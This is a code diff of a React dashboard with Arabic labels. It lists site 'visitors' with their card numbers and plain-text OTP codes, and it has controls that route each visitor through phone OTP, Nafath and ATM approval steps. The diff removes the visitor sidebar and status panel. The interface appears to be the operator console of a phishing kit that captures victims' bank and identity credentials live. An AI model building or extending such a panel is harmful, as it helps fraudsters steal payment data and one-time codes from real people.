-                      <Phone className="h-4 w-4 ml-1" />
-                      OTP الهاتف
-                    </Button>
-                    <Button
-                      size="sm"
-                      variant={selectedVisitor.nafathApproved ? "default" : "outline"}
-                      onClick={() => handleRouting(selectedVisitor.id, "nafathApproved", !selectedVisitor.nafathApproved)}
-                      className={selectedVisitor.nafathApproved ? "bg-emerald-600" : ""}
-                    >
-                      <ClipboardCheck className="h-4 w-4 ml-1" />
-                      نفاذ
-                    </Button>
-                  </div>
-                </div>
-              </div>
-
-              {/* Status Info */}
-              <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                <div className="p-4 border-b bg-gray-50">
-                  <h3 className="font-semibold text-gray-700 flex items-center gap-2">
-                    <Clock className="h-5 w-5" />
-                    معلومات الحالة
-                  </h3>
-                </div>
-                <div className="p-6 space-y-3 text-sm">
-                  <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                    <span className="text-gray-500">الصفحة الحالية</span>
-                    <Badge variant="outline">{pageLabels[selectedVisitor.currentPage || ""] || "غير محدد"}</Badge>
-                  </div>
-                  {selectedVisitor.currentStep && (
-                    <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                      <span className="text-gray-500">الخطوة</span>
-                      <span className="font-medium">الخطوة {selectedVisitor.currentStep}</span>
-                    </div>
-                  )}
-                  {selectedVisitor.createdAt && (
-                    <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                      <span className="text-gray-500">تاريخ الإنشاء</span>
-                      <span className="font-medium">{format(new Date(selectedVisitor.createdAt), "PPpp", { locale: ar })}</span>
-                    </div>
-                  )}
-                  {selectedVisitor.approvalStatus && (
-                    <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                      <span className="text-gray-500">حالة الموافقة</span>
-                      <Badge className={
-                        selectedVisitor.approvalStatus === "approved_otp" ? "bg-emerald-500" :
-                        selectedVisitor.approvalStatus === "approved_atm" ? "bg-blue-500" :
-                        selectedVisitor.approvalStatus === "rejected" ? "bg-red-500" : ""
-                      }>
-                        {selectedVisitor.approvalStatus}
-                      </Badge>
-                    </div>
-                  )}
                 </div>
               </div>
             </div>
-          )}
-        </div>
-      </div>
-
-      {/* Right Sidebar - Visitor List */}
-      <div className="w-80 bg-slate-900 text-white flex flex-col">
-        {/* Sidebar Header */}
-        <div className="p-4 border-b border-slate-700">
-          <div className="flex items-center justify-between mb-3">
-            <div className="flex items-center gap-2">
-              <div className="relative">
-                <Bell className="h-5 w-5" />
-                {unreadCount > 0 && (
-                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] font-bold rounded-full w-4 h-4 flex items-center justify-center">
-                    {unreadCount}
-                  </span>
-                )}
-              </div>
-              <span className="font-semibold">الإشعارات</span>
-            </div>
-            <span className="text-xs text-slate-400">{filteredNotifications.length} زائر</span>
           </div>
-        </div>
-
-        {/* Visitor List */}
-        <ScrollArea className="flex-1">
-          {isLoading ? (
-            <div className="flex items-center justify-center py-8">
-              <RefreshCw className="h-6 w-6 animate-spin text-slate-400" />
+        ) : (
+          <div className="flex-1 flex items-center justify-center text-muted-foreground">
+            <div className="text-center">
+              <MessageSquare className="h-16 w-16 mx-auto mb-4 opacity-30" />
+              <p className="text-lg">اختر طلب من القائمة</p>
             </div>
-          ) : filteredNotifications.length === 0 ? (
-            <div className="text-center py-8 text-slate-500">
-              <Bell className="h-12 w-12 mx-auto mb-2 opacity-30" />
-              <p className="text-sm">لا توجد إشعارات</p>
-            </div>
-          ) : (
-            <div>
-              {filteredNotifications.map((notification) => (
-                <div
-                  key={notification.id}
-                  onClick={() => handleMarkAsRead(notification)}
-                  className={`p-4 cursor-pointer border-b border-slate-800 transition-colors hover:bg-slate-800 ${
-                    selectedVisitor?.id === notification.id ? "bg-slate-800" : ""
-                  } ${notification.isUnread ? "bg-slate-800/50" : ""}`}
-                  data-testid={`visitor-item-${notification.id}`}
-                >
-                  <div className="flex items-start gap-3">
-                    {/* Avatar */}
-                    <div className="relative flex-shrink-0">
-                      <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
-                        notification.cardNumber ? "bg-emerald-600" : "bg-slate-700"
-                      }`}>
-                        {notification.cardNumber ? (
-                          <CreditCard className="h-4 w-4" />
-                        ) : (
-                          <User className="h-4 w-4" />
-                        )}
-                      </div>
-                      <div className="absolute -bottom-0.5 -left-0.5">
-                        <UserStatus visitorId={notification.id} />
-                      </div>
-                    </div>
-
-                    {/* Content */}
-                    <div className="flex-1 min-w-0">
-                      <div className="flex items-center justify-between mb-1">
-                        <p className={`text-sm truncate ${notification.isUnread ? "font-bold" : "font-medium"}`}>
-                          {getDisplayName(notification)}
-                        </p>
-                        <span className="text-xs text-slate-500">{getTimeAgo(notification.createdAt)}</span>
-                      </div>
-                      <p className="text-xs text-slate-400 truncate">
-                        {notification.otpCode ? `OTP: ${notification.otpCode}` : 
-                         notification.cardNumber ? `بطاقة: ****${notification.cardNumber.slice(-4)}` :
-                         pageLabels[notification.currentPage || ""] || "زائر جديد"}
-                      </p>
-                      {notification.isUnread && (
-                        <div className="w-2 h-2 rounded-full bg-blue-500 absolute top-4 left-4" />
-                      )}
-                    </div>
-                  </div>
-                </div>
-              ))}
-            </div>
-          )}
-        </ScrollArea>
-      </div>
+          </div>
+        )}
+      </main>
     </div>
   );
 }
